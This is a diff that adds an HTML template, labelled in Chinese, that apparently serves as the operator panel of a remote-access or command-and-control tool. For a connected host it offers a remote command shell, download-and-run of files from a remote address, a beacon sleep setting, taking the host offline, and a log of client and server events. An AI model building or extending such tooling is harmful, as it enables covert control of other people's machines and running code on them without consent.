@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="utf-8">
+    <title>Manager</title>
+    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.css">
+    <script src="/static/js/jquery-3.3.1.js"></script>
+    <script src="/static/js/bootstrap.js"></script>
+    <script src="/static/js/base64.js"></script>
+    <style>
+        .t {
+            background-color: red;
+            width: 400px;
+            height: 400px;
+
+            /*此元素会作为一个表格单元格显示
+            （类似 <td> 和 <th>）*/
+            display: table-cell;
+            /*垂直居中 */
+            vertical-align: middle;
+            /*水平居中*/
+            text-align: center;
+        }
+    </style>
+    <script type="text/javascript">
+        var textarea = document.getElementById('cmd_textarea');
+        textarea.scrollTop = textarea.scrollHeight;
+    </script>
+</head>
+<body>
+    <div class="page-header">
+        <h2 class="text-center">Manager : {{ conn.ip }} / {{conn.info.remarks}} /  {{conn.sleep}}s </h2>
+    </div>
+
+<center>
+    <div id="shell"  class="t">
+        <h3>Cmd Shell</h3>
+        <br>
+        <form action="?action=shell" method="POST">
+            <label>
+                命令：<input name="command" type="text" value="whoami">
+                <br>
+                <input type="submit" value="提交">
+            </label>
+        </form>
+        
+       
+    </div>
+
+    <div id="remark" class="t">
+        <h3>修改备注</h3>
+        <br>
+        <form action="?action=remark" method="POST">
+            更改备注：<input name="remark_text" type="text">
+            <br>
+            <input type="submit" value="提交">
+        </form>
+
+        <form action="?action=sleep" method="POST">
+            Sleep：<input name="sleep" type="text">
+            <br>
+            <input type="submit" value="提交">
+        </form>
+
+        <a href="?action=clear">清空缓存</a><br>
+        <a href="?action=delete">下线</a>
+        <a href="../">返回</a>
+    </div>
+
+
+
+
+    <div id="download" class="t">
+        <h3>下载文件</h3>
+        <br>
+        <form action="?action=download" method="POST">
+            远程地址：<input name="http" type="text">
+            <br>
+            保存路径：<input name="path" type="text">
+            <br>
+            是否运行：<select name="is_run">
+                        <option value="yes">是</option>
+                        <option value="no">否</option>
+                    </select>
+                <br>
+            <input type="submit" value="提交">
+        </form>
+    </div>
+</center>
+<div id="div_log" width="80%"
+     style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
+    <h2>日志</h2>
+    <div id="log" style="border-style:solid; border-width:1px; border-color:#000;">
+        {% for i in events %}
+            {% if i.is_client  %}
+                <div style="text-align: left;border: 1px dotted black;">
+                    <h4  style='color:green'>From {{ i.action }} Date: {{ i.time }}</h4>
+                    <p style='color:green'> {{ i.data }}</p>
+                </div>
+                {% else %}
+                <div style="text-align: right;border: 1px dotted black;">
+                    <h4  style='color:red'>From {{ i.action }} Date: {{ i.time }}</h4>
+                    <p style='color:red'> {{ i.data }}</p>
+                </div>
+            {% endif %}
+            
+        {% endfor %}
+    </div>
+</div>
+
+</body>
